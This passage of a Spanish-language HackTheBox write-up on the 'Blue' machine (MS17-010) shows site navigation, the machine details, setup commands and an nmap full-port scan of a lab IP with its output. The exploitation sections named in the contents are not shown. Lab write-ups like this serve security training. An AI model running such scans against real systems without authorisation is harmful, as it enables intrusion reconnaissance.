@@ -1,0 +1,1557 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+      
+      
+      
+        <link rel="prev" href="../../../../articles/kali-linux/">
+      
+      
+        <link rel="next" href="../lame/">
+      
+      
+      <link rel="icon" href="../../../../img/kzf-logo.png">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.6.13">
+    
+    
+      
+        <title>Blue - KrozFu</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../../../assets/stylesheets/main.342714a4.min.css">
+      
+        
+        <link rel="stylesheet" href="../../../../assets/stylesheets/palette.06af60db.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+    <script>__md_scope=new URL("../../../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+      
+        <meta  property="og:type"  content="website" >
+      
+        <meta  property="og:title"  content="Blue - KrozFu" >
+      
+        <meta  property="og:description"  content="None" >
+      
+        <meta  property="og:image"  content="./assets/images/social/writeups/hackthebox/machines/blue.png" >
+      
+        <meta  property="og:image:type"  content="image/png" >
+      
+        <meta  property="og:image:width"  content="1200" >
+      
+        <meta  property="og:image:height"  content="630" >
+      
+        <meta  property="og:url"  content="None" >
+      
+        <meta  name="twitter:card"  content="summary_large_image" >
+      
+        <meta  name="twitter:title"  content="Blue - KrozFu" >
+      
+        <meta  name="twitter:description"  content="None" >
+      
+        <meta  name="twitter:image"  content="./assets/images/social/writeups/hackthebox/machines/blue.png" >
+      
+    
+    
+  </head>
+  
+  
+    
+    
+      
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="teal" data-md-color-accent="purple">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#informacion-maquina" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+<header class="md-header" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href="../../../.." title="KrozFu" class="md-header__button md-logo" aria-label="KrozFu" data-md-component="logo">
+      
+  <img src="../../../../img/kzf-logo.png" alt="logo">
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            KrozFu
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              Blue
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+        <form class="md-header__option" data-md-component="palette">
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="" data-md-color-scheme="default" data-md-color-primary="teal" data-md-color-accent="purple"  aria-label="Switch to dark mode"  type="radio" name="__palette" id="__palette_0">
+    
+      <label class="md-header__button md-icon" title="Switch to dark mode" for="__palette_1" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M17 6H7c-3.31 0-6 2.69-6 6s2.69 6 6 6h10c3.31 0 6-2.69 6-6s-2.69-6-6-6m0 10H7c-2.21 0-4-1.79-4-4s1.79-4 4-4h10c2.21 0 4 1.79 4 4s-1.79 4-4 4M7 9c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3"/></svg>
+      </label>
+    
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="" data-md-color-scheme="slate" data-md-color-primary="teal" data-md-color-accent="lime"  aria-label="Switch to light mode"  type="radio" name="__palette" id="__palette_1">
+    
+      <label class="md-header__button md-icon" title="Switch to light mode" for="__palette_0" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M17 7H7a5 5 0 0 0-5 5 5 5 0 0 0 5 5h10a5 5 0 0 0 5-5 5 5 0 0 0-5-5m0 8a3 3 0 0 1-3-3 3 3 0 0 1 3-3 3 3 0 0 1 3 3 3 3 0 0 1-3 3"/></svg>
+      </label>
+    
+  
+</form>
+      
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+    
+    
+    
+      
+      
+        <label class="md-header__button md-icon" for="__search">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        </label>
+        <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+        <div class="md-search__suggest" data-md-component="search-suggest"></div>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+      
+    
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+            
+<nav class="md-tabs" aria-label="Tabs" data-md-component="tabs">
+  <div class="md-grid">
+    <ul class="md-tabs__list">
+      
+        
+  
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../../.." class="md-tabs__link">
+        
+  
+  
+    
+  
+  Whoami
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../../articles/nat-attack-hping/" class="md-tabs__link">
+          
+  
+  
+  Projects
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+    
+  
+  
+    
+    
+      
+  
+  
+  
+    
+  
+  
+    
+    
+      
+  
+  
+  
+    
+  
+  
+    
+    
+      <li class="md-tabs__item md-tabs__item--active">
+        <a href="./" class="md-tabs__link">
+          
+  
+  
+  Writeups
+
+        </a>
+      </li>
+    
+  
+
+    
+  
+
+    
+  
+
+      
+    </ul>
+  </div>
+</nav>
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+  
+
+
+  
+
+<nav class="md-nav md-nav--primary md-nav--lifted md-nav--integrated" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../../../.." title="KrozFu" class="md-nav__button md-logo" aria-label="KrozFu" data-md-component="logo">
+      
+  <img src="../../../../img/kzf-logo.png" alt="logo">
+
+    </a>
+    KrozFu
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../.." class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Whoami
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    Projects
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2">
+            <span class="md-nav__icon md-icon"></span>
+            Projects
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../articles/nat-attack-hping/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Configuración NAT y ataque con hping MikroTik
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../articles/wireguard/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Implementación WireGuard
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../articles/servidor-ubuntu/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Implementación Servidores
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../articles/kali-linux/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Instalar Kali Linux VMware
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+    
+  
+  
+  
+    
+    
+    
+    
+      
+        
+        
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    Writeups
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_3">
+            <span class="md-nav__icon md-icon"></span>
+            Writeups
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    
+    
+    
+    
+      
+      
+        
+          
+          
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_1" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_3_1" id="__nav_3_1_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    HackTheBox
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_1_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_3_1">
+            <span class="md-nav__icon md-icon"></span>
+            HackTheBox
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_1_1" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_3_1_1" id="__nav_3_1_1_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    Machines
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_3_1_1_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_3_1_1">
+            <span class="md-nav__icon md-icon"></span>
+            Machines
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  
+  <span class="md-ellipsis">
+    Blue
+    
+  </span>
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        
+  
+  
+  <span class="md-ellipsis">
+    Blue
+    
+  </span>
+  
+
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#informacion-maquina" class="md-nav__link">
+    <span class="md-ellipsis">
+      Información maquina
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#introduccion" class="md-nav__link">
+    <span class="md-ellipsis">
+      Introducción
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#requisitos-previos" class="md-nav__link">
+    <span class="md-ellipsis">
+      Requisitos previos
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#reconocimiento" class="md-nav__link">
+    <span class="md-ellipsis">
+      Reconocimiento
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#enumeracion-de-smb" class="md-nav__link">
+    <span class="md-ellipsis">
+      Enumeración de SMB
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#explotacion-utilizando-el-framework-de-metasploit" class="md-nav__link">
+    <span class="md-ellipsis">
+      Explotación utilizando el framework de Metasploit
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#explotacion-utilizando-script-de-python" class="md-nav__link">
+    <span class="md-ellipsis">
+      Explotación utilizando script de Python
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../lame/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Lame
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../cicada/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Cicada
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_1_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_3_1_2" id="__nav_3_1_2_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    Challenges
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_3_1_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_1_2">
+            <span class="md-nav__icon md-icon"></span>
+            Challenges
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_1_2_1" >
+        
+          
+          <label class="md-nav__link" for="__nav_3_1_2_1" id="__nav_3_1_2_1_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    Pwn
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="4" aria-labelledby="__nav_3_1_2_1_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_1_2_1">
+            <span class="md-nav__icon md-icon"></span>
+            Pwn
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../challenges/pwn/r0bob1rd/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    R0bob1rd
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_1_2_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_3_1_2_2" id="__nav_3_1_2_2_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    Coding
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="4" aria-labelledby="__nav_3_1_2_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_1_2_2">
+            <span class="md-nav__icon md-icon"></span>
+            Coding
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../challenges/coding/primed-for-action/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Primed-for-Action
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_1_2_3" >
+        
+          
+          <label class="md-nav__link" for="__nav_3_1_2_3" id="__nav_3_1_2_3_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    Hardware
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="4" aria-labelledby="__nav_3_1_2_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_1_2_3">
+            <span class="md-nav__icon md-icon"></span>
+            Hardware
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../challenges/hardware/the-needle/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    The-Needle
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+      
+      
+        
+          
+          
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_3_2" id="__nav_3_2_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    TryHackMe
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_2">
+            <span class="md-nav__icon md-icon"></span>
+            TryHackMe
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../tryhackme/pickle-rick/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Pickle Rick
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+
+
+  <h1>Blue</h1>
+
+<h2 id="informacion-maquina">Información maquina</h2>
+<table>
+<thead>
+<tr>
+<th><strong>Parámetros</strong></th>
+<th><strong>Características</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>OS</td>
+<td>Windows</td>
+</tr>
+<tr>
+<td>Dificultad</td>
+<td>Easy</td>
+</tr>
+<tr>
+<td>Creador</td>
+<td>ch4p</td>
+</tr>
+<tr>
+<td>Link</td>
+<td><a href="https://www.hackthebox.com/machines/blue">Blue</a></td>
+</tr>
+</tbody>
+</table>
+<h2 id="introduccion">Introducción</h2>
+<p>Blue es un CTF disponible en diversas plataformas, conocido por su dificultad fácil. En esta máquina, se requiere explotar la vulnerabilidad MS17-010 para obtener una shell con privilegios de System. A lo largo del proceso, aprenderemos a enumerar la vulnerabilidad MS17-010 en la máquina utilizando Nmap, en una primera instancia se utilizara  Metasploit, y también se realizara escalamiento de privilegios a nivel de administrador con un script en Python.</p>
+<h2 id="requisitos-previos">Requisitos previos</h2>
+<p>Creamos <strong>directorios</strong> para poder almacenar los diferentes archivos de trabajo maquina.</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>&gt;<span class="w"> </span>mkdir<span class="w"> </span>nmap<span class="w"> </span>content<span class="w"> </span>script<span class="w"> </span>exploits
+<a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a>&gt;<span class="w"> </span><span class="nb">export</span><span class="w"> </span><span class="nv">blue</span><span class="o">=</span><span class="s2">&quot;10.129.230.92&quot;</span>
+</code></pre></div>
+<h2 id="reconocimiento">Reconocimiento</h2>
+<p>Para ver a que tipo de maquina estamos explorando, realizamos una traza ICMP hacia la maquina y como se puede observar el TTL es de 127, que esta en el rango de una maquina Windows.</p>
+<p><img alt="img" src="../img/blue/Pasted%20image%2020240526145148.png" /></p>
+<p>Realizamos el respectivo reconocimiento con <code>nmap</code>.</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>nmap<span class="w"> </span>-p-<span class="w"> </span>-sV<span class="w"> </span>-sC<span class="w"> </span>--open<span class="w"> </span>-sS<span class="w"> </span>-vvv<span class="w"> </span>-Pn<span class="w"> </span><span class="nv">$blue</span><span class="w"> </span>-oN<span class="w"> </span>escaneo
+</code></pre></div>
+<p>Al finalizar obtenemos el siguiente escaneo, donde se puede observar los puertos que se tienen abiertos a nivel de maquina, los cuales en este caso nos interesan los puertos 135, 139, 445.</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a><span class="n">Nmap</span> <span class="n">scan</span> <span class="n">report</span> <span class="k">for</span> <span class="mf">10.129.230.92</span>
+<a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a><span class="n">Host</span> <span class="ow">is</span> <span class="n">up</span><span class="p">,</span> <span class="n">received</span> <span class="n">user</span><span class="o">-</span><span class="nb">set</span> <span class="p">(</span><span class="mf">0.098</span><span class="n">s</span> <span class="n">latency</span><span class="p">)</span><span class="o">.</span>
+<a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a><span class="n">Scanned</span> <span class="n">at</span> <span class="mi">2024</span><span class="o">-</span><span class="mi">05</span><span class="o">-</span><span class="mi">26</span> <span class="mi">15</span><span class="p">:</span><span class="mi">54</span><span class="p">:</span><span class="mi">06</span> <span class="n">EDT</span> <span class="k">for</span> <span class="mi">104</span><span class="n">s</span>
+<a id="__codelineno-2-4" name="__codelineno-2-4" href="#__codelineno-2-4"></a><span class="n">Not</span> <span class="n">shown</span><span class="p">:</span> <span class="mi">65447</span> <span class="n">closed</span> <span class="n">tcp</span> <span class="n">ports</span> <span class="p">(</span><span class="n">reset</span><span class="p">),</span> <span class="mi">79</span> <span class="n">filtered</span> <span class="n">tcp</span> <span class="n">ports</span> <span class="p">(</span><span class="n">no</span><span class="o">-</span><span class="n">response</span><span class="p">)</span>
+<a id="__codelineno-2-5" name="__codelineno-2-5" href="#__codelineno-2-5"></a><span class="n">Some</span> <span class="n">closed</span> <span class="n">ports</span> <span class="n">may</span> <span class="n">be</span> <span class="n">reported</span> <span class="k">as</span> <span class="n">filtered</span> <span class="n">due</span> <span class="n">to</span> <span class="o">--</span><span class="n">defeat</span><span class="o">-</span><span class="n">rst</span><span class="o">-</span><span class="n">ratelimit</span>
+<a id="__codelineno-2-6" name="__codelineno-2-6" href="#__codelineno-2-6"></a><span class="n">PORT</span>      <span class="n">STATE</span> <span class="n">SERVICE</span>      <span class="n">REASON</span>          <span class="n">VERSION</span>
+<a id="__codelineno-2-7" name="__codelineno-2-7" href="#__codelineno-2-7"></a><span class="mi">135</span><span class="o">/</span><span class="n">tcp</span>   <span class="nb">open</span>  <span class="n">msrpc</span>        <span class="n">syn</span><span class="o">-</span><span class="n">ack</span> <span class="n">ttl</span> <span class="mi">127</span> <span class="n">Microsoft</span> <span class="n">Windows</span> <span class="n">RPC</span>
+<a id="__codelineno-2-8" name="__codelineno-2-8" href="#__codelineno-2-8"></a><span class="mi">139</span><span class="o">/</span><span class="n">tcp</span>   <span class="nb">open</span>  <span class="n">netbios</span><span class="o">-</span><span class="n">ssn</span>  <span class="n">syn</span><span class="o">-</span><span class="n">ack</span> <span class="n">ttl</span> <span class="mi">127</span> <span class="n">Microsoft</span> <span class="n">Windows</span> <span class="n">netbios</span><span class="o">-</span><span class="n">ssn</span>
+<a id="__codelineno-2-9" name="__codelineno-2-9" href="#__codelineno-2-9"></a><span class="mi">445</span><span class="o">/</span><span class="n">tcp</span>   <span class="nb">open</span>  <span class="n">microsoft</span><span class="o">-</span><span class="n">ds</span> <span class="n">syn</span><span class="o">-</span><span class="n">ack</span> <span class="n">ttl</span> <span class="mi">127</span> <span class="n">Windows</span> <span class="mi">7</span> <span class="n">Professional</span> <span class="mi">7601</span> <span class="n">Service</span> <span class="n">Pack</span> <span class="mi">1</span> <span class="n">microsoft</span><span class="o">-</span><span class="n">ds</span> <span class="p">(</span><span class="n">workgroup</span><span class="p">:</span> <span class="n">WORKGROUP</span><span class="p">)</span>
+<a id="__codelineno-2-10" name="__codelineno-2-10" href="#__codelineno-2-10"></a><span class="mi">49152</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">msrpc</span>        <span class="n">syn</span><span class="o">-</span><span class="n">ack</span> <span class="n">ttl</span> <span class="mi">127</span> <span class="n">Microsoft</span> <span class="n">Windows</span> <span class="n">RPC</span>
